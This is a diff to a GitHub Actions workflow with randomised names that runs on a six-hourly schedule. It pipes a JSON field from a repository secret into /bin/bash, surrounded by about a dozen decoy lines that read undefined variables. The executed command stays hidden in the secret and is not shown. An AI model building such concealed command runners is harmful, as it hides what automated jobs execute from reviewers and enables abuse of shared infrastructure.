@@ -3,25 +3,30 @@ name: piqijing4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 1/6 * * *'
+    - cron: '1 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: piqijing4567
         env:
-          u126: ${{ secrets.u126 }}
+          qxb4: ${{ secrets.qxb4 }}
         run: |
-          echo $u126 | jq -r .sc63484 | /bin/bash
-          echo $zcuk03502 | jq -r .mwa6487 | /bin/bash
-          echo $x551 | jq -r .f8564 | /bin/bash
-          echo $bcvmj1124 | jq -r .xfnmb4863 | /bin/bash
-          echo $yphq71965 | jq -r .yjo17617 | /bin/bash
-          echo $j72 | jq -r .prvf868 | /bin/bash
-          echo $tgne95 | jq -r .tbgeh0667 | /bin/bash
-          echo $c26166 | jq -r .g178 | /bin/bash
-          echo $qwu5667 | jq -r .kvhxk91700 | /bin/bash
-          echo $au1708 | jq -r .mlu7576 | /bin/bash
-          echo $x1529 | jq -r .f01 | /bin/bash
+          echo $qxb4 | jq -r .rjsx71091 | /bin/bash
+          echo $fv32 | jq -r .hmknb74919 | /bin/bash
+          echo $pald9756 | jq -r .wnu7232 | /bin/bash
+          echo $ymbl11456 | jq -r .cnq828 | /bin/bash
+          echo $k61095 | jq -r .hfpto807 | /bin/bash
+          echo $h861 | jq -r .obtsx78 | /bin/bash
+          echo $rjljw110 | jq -r .wfyty11 | /bin/bash
+          echo $ojsl40083 | jq -r .jtch47 | /bin/bash
+          echo $gsq21 | jq -r .atn733 | /bin/bash
+          echo $h7 | jq -r .d91524 | /bin/bash
+          echo $ur8 | jq -r .odpe02 | /bin/bash
+          echo $abg315 | jq -r .ucf7123 | /bin/bash
+          echo $n86682 | jq -r .n1339 | /bin/bash
+          echo $njtq315 | jq -r .x8 | /bin/bash
+          echo $cgxi2 | jq -r .bhxpp39 | /bin/bash
 
